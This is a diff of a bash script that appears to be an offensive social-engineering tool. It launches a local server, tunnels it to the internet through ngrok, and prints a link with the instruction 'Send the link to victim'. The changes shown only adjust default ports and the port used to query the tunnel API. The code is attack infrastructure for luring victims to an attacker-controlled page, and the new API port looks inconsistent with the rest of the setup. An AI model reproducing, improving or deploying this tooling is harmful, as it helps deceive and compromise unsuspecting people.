@@ -229,7 +229,7 @@ start_n() {
     echo ""
     else
     printf "\e[0m\n"
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:5555\e[0m\e[1;92m)\e[0m\n"
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:8080\e[0m\e[1;92m)\e[0m\n"
     arch=$(uname -a | grep -o 'arm' | head -n1)
     arch2=$(uname -a | grep -o 'Android' | head -n1)
     if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -260,12 +260,12 @@ start_n() {
     sleep 2
     ./ngrok http 8080 > /dev/null 2>&1 &
     sleep 10
-    link=$(curl -s -N http://127.0.0.1:8080/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+    link=$(curl -s -N http://127.0.0.1:9000/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
     found
 }
 start_local(){
-    def_port="5555"
+    def_port="8080"
     printf "\e[0m\n"
     printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
     read port
@@ -309,7 +309,7 @@ start_local(){
     done
 }
 start_l() {
-    def_port="5555"
+    def_port="8080"
     printf "\e[0m\n"
     printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
     read port
